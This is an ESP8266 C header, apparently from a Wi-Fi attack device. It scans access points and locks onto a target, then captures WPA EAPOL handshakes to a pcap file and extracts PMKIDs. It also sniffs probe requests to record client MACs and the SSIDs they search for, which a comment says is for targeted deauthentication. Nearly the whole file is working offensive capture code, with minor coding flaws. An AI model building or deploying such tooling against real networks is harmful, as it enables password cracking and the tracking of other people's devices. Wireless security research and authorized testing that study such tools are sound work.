#ifndef WIFI_UTILS_H
#define WIFI_UTILS_H

#include <ESP8266WiFi.h>
#include <SD.h>
#include "config.h"

extern Network scanList[];
extern int     scanCount;
extern uint8_t targetMac[];
extern uint8_t targetChan;

// Maximum number of clients we'll track
#define MAX_CLIENTS 8

// ============================================================
//  Scan / Lock / Handshake capture
// ============================================================

// --- Passive scan ---
void performScan() {
  scanCount = 0;
  // Disconnect STA mode so promisc mode is clean
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  int n = WiFi.scanNetworks(false, true);  // async=false, show_hidden=true
  for (int i = 0; i < n && scanCount < MAX_TARGETS; i++) {
    Network& net = scanList[scanCount];
    WiFi.SSID(i).toCharArray(net.ssid, sizeof(net.ssid) - 1);
    net.ssid[sizeof(net.ssid) - 1] = '\0';
    memcpy(net.bssid, WiFi.BSSID(i), 6);
    net.channel   = WiFi.channel(i);
    net.rssi      = WiFi.RSSI(i);
    net.encrypted = (WiFi.encryptionType(i) != ENC_TYPE_NONE);
    scanCount++;
  }
  WiFi.scanDelete();
}

void lockTargetByIdx(int idx) {
  if (idx >= 0 && idx < scanCount) {
    memcpy(targetMac, scanList[idx].bssid, 6);
    targetChan = (uint8_t)scanList[idx].channel;
    wifi_set_channel(targetChan);
    delay(1);
  }
}

// ============================================================
//  Promiscuous mode - handshake capture to storage
//  Also detects probe requests from clients (for targeted deauth)
// ============================================================

static File     pcapFile;
static uint32_t pcapCount = 0;
static uint32_t eapolCount = 0;
static bool     capRunning = false;

// libpcap global header (24 bytes)
static const uint8_t pcapGlobalHdr[24] = {
  0xD4, 0xC3, 0xB2, 0xA1,   // magic
  0x02, 0x00, 0x04, 0x00,   // version 2.4
  0x00, 0x00, 0x00, 0x00,   // thiszone
  0x00, 0x00, 0x00, 0x00,   // sigfigs
  0xFF, 0xFF, 0x00, 0x00,   // snaplen=65535
  0x7E, 0x00, 0x00, 0x00    // linktype=127 (IEEE 802.11)
};

void writePcapHeader(File& f) {
  f.write(pcapGlobalHdr, sizeof(pcapGlobalHdr));
}

// Write one packet record
void writePcapPacket(File& f, const uint8_t* data, uint16_t len, uint32_t ts) {
  uint32_t sec = ts / 1000000;
  uint32_t usec = ts % 1000000;
  uint32_t orig = len;
  f.write((uint8_t*)&sec,   4);
  f.write((uint8_t*)&usec,  4);
  f.write((uint8_t*)&len,   4);
  f.write((uint8_t*)&orig,  4);
  f.write(data, len);
}

// Track clients we see in probe requests
uint8_t knownClients[MAX_CLIENTS][6];
int knownClientCount = 0;
char probedSSIDs[16][33];
int probedSSIDCount = 0;
bool pmkidCaptured = false;  // PMKID seen in EAPOL M1

// Add a known client (called from promiscRx)
void addKnownClient(const uint8_t* mac) {
  if (mac[0] & 0x01) return;  // multicast
  for (int i = 0; i < knownClientCount; i++) {
    if (memcmp(knownClients[i], mac, 6) == 0) return;  // already known
  }
  if (knownClientCount < MAX_CLIENTS) {
    memcpy(knownClients[knownClientCount], mac, 6);
    knownClientCount++;
    Serial.print(F("[probe] New client: "));
    for (int i = 0; i < 6; i++) {
      if (mac[i] < 16) Serial.print(F("0"));
      Serial.print(mac[i], HEX);
      if (i < 5) Serial.print(F(":"));
    }
    Serial.println();
  }
}

// Promiscuous RX callback
void promiscRx(uint8_t* buf, uint16_t len) {
  if (len < 24) return;
  uint8_t fc = buf[0];
  uint8_t type = (fc & 0x0C) >> 2;
  uint8_t subtype = (fc & 0xF0) >> 4;

  // Capture handshake / PMKID if enabled
  if (capRunning && pcapFile) {
    if (type == 0x02) {  // data frame
      for (int off = 24; off <= 26 && off + 8 < len; off++) {
        if (buf[off+6] == 0x88 && buf[off+7] == 0x8E) {
          // EAPOL frame - save to pcap
          writePcapPacket(pcapFile, buf, len, micros());
          pcapFile.flush();
          pcapCount++;
          eapolCount++;
          if (eapolCount <= 4) {
            Serial.print(F("[cap] EAPOL M"));
            Serial.println(eapolCount);
          }
          // Check for PMKID in EAPOL M1
          // PMKID is in key data field with vendor-specific type 0x00:0x0a:0xac
          // Offset within EAPOL: ~80-100 bytes from start
          if (eapolCount == 1 && len > 100) {
            // Look for PMKID vendor specific OUI 0x00:0x0a:0xac
            for (int i = 0; i < (int)len - 6; i++) {
              if (buf[i] == 0x00 && buf[i+1] == 0x0a && buf[i+2] == 0xac) {
                if (i + 22 < len) {
                  Serial.print(F("[pmkid] FOUND! len="));
                  Serial.println(len);
                  Serial.print(F("[pmkid] "));
                  for (int j = 0; j < 22; j++) {
                    if (buf[i+j] < 16) Serial.print(F("0"));
                    Serial.print(buf[i+j], HEX);
                  }
                  Serial.println();
                  pmkidCaptured = true;
                  break;
                }
              }
            }
          }
          break;
        }
      }
    }
  }

  // Probe request sniffing (Mgmt / Probe Request)
  if (type == 0x00 && subtype == 0x04) {
    if (len >= 30) {
      uint8_t clientMac[6];
      memcpy(clientMac, buf + 10, 6);
      addKnownClient(clientMac);

      // Parse SSID IE
      int off = 24;
      while (off + 2 < len) {
        uint8_t tag = buf[off];
        uint8_t sslen = buf[off + 1];
        if (tag == 0x00 && sslen > 0 && sslen < 32) {
          char ssid[33] = {0};
          memcpy(ssid, buf + off + 2, sslen);
          ssid[sslen] = '\0';
          // Track this SSID
          if (probedSSIDCount < 16 && strlen(ssid) > 0) {
            strncpy(probedSSIDs[probedSSIDCount], ssid, 32);
            probedSSIDCount++;
          }
          // Check if matches our target
          for (int i = 0; i < scanCount; i++) {
            if (strcmp(scanList[i].ssid, ssid) == 0) {
              Serial.print(F("[probe] Client searching for "));
              Serial.print(ssid);
              Serial.print(F(" MAC="));
              for (int j = 0; j < 6; j++) {
                if (clientMac[j] < 16) Serial.print(F("0"));
                Serial.print(clientMac[j], HEX);
                if (j < 5) Serial.print(F(":"));
              }
              Serial.println();
              break;
            }
          }
          break;
        }
        off += 2 + sslen;
      }
    }
  }
}

void startHandshakeCapture(const char* path) {
  if (capRunning) return;
  // Try SD first, fallback to LittleFS
  bool useSD = SD.begin(SD_CS);
  if (useSD) {
    pcapFile = SD.open(path, FILE_WRITE);
  } else {
    pcapFile = LittleFS.open(path, "w");
  }
  if (!pcapFile) return;
  writePcapHeader(pcapFile);
  // Switch to promisc mode on current channel
  wifi_set_promiscuous_rx_cb(promiscRx);
  wifi_promiscuous_enable(1);
  capRunning = true;
  pcapCount = 0;
  eapolCount = 0;
  // Don't reset knownClientCount - preserve across captures
}

void stopHandshakeCapture() {
  if (!capRunning) return;
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(nullptr);
  if (pcapFile) {
    pcapFile.close();
  }
  capRunning = false;
}

#endif
